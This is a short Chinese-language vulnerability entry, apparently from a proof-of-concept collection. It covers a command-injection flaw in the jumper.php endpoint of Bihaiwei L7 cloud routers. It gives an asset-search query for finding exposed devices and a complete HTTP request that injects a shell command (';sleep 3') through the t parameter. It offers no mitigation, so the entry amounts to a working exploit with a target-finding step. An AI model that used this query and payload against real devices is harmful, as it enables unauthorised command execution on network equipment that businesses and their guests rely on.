# 碧海威 L7多款产品jumper存在命令执行漏洞

# 一、漏洞简介
碧海威L7网络产品是为酒店、度假村、商场和车站等商用无线管理者独身订造的专用网络设备。设备具备路由、防火墙、流控、无线AC控制器、微信认证等多项功能。碧海威 L7多款产品jumper存在命令执行漏洞

# 二、影响版本
+ 碧海威 L7云路由

# 三、资产测绘
```plain
product="碧海威科技-L7云路由"
```

![1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d.png](./img/vNePAYlOhVA2Jyhf/1717872509836-9d8192e8-eb1d-418e-b136-d7e256390d0d-444380.png)

# 四、漏洞复现
```plain
GET /notice/jumper.php?t=;sleep%203 HTTP/1.1
Host: 
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
```

![1717873704369-554c7e1b-fc19-438c-b0c1-8c9cff46c2a7.png](./img/vNePAYlOhVA2Jyhf/1717873704369-554c7e1b-fc19-438c-b0c1-8c9cff46c2a7-473227.png)



> 更新: 2024-06-27 09:15:18  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pcxmpv0re7iyse3f>